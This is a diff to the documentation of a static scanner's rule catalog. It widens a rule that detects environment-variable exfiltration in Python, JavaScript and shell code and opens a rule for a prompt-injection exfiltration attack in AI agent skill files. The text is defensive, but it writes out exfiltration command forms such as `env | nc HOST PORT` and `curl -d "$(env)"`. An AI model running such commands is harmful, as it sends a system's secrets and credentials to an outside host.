@@ -256,7 +256,7 @@ Full rule catalog in Semgrep-portable YAML. Category summary:
     regex: "^(post|put|patch|get|request)$"
   severity: ERROR   # → Critical
 ```
-The regex pass also follows the environment through variables, return values, and function arguments to `urllib`, `requests`, `httpx`, `aiohttp`, `http.client`, and `socket` calls in the same file. Plus a JS pattern for `fetch(url, { body: JSON.stringify(process.env) })` and shell regexes for an environment dump (such as `env`, `printenv`, `export -p`, or `set`) sent as curl or wget data (`curl -d "$(env)"`, `--data @<(env)`) or sent to the stdin of a network client (`env | curl -d @- URL`, `env | nc HOST PORT`, `curl --data-binary @- URL <<< "$(env)"`). See `specs/RULES.md` for the exact forms.
+The regex pass also follows the environment through variables, return values, and function arguments to `urllib`, `requests`, `httpx`, `aiohttp`, `http.client`, and `socket` calls in the same file. In JavaScript and TypeScript, it flags `JSON.stringify(process.env)` anywhere, and it follows the whole `process.env` (a spread, `Object.entries`, `Object.keys`, `Object.values`, `URLSearchParams`, `util.inspect`, or a copy in a variable) to `fetch`, `axios`, `got`, `http.request`, socket, and WebSocket calls in the same file. Plus shell regexes for an environment dump (such as `env`, `printenv`, `export -p`, or `set`) sent as curl or wget data (`curl -d "$(env)"`, `--data @<(env)`) or sent to the stdin of a network client (`env | curl -d @- URL`, `env | nc HOST PORT`, `curl --data-binary @- URL <<< "$(env)"`). See `specs/RULES.md` for the exact forms.
 
 **`PI-EXFIL-TRIGGER-CLAUSE` — Critical.** The Repello-signature SKILL.md attack.
 ```regex
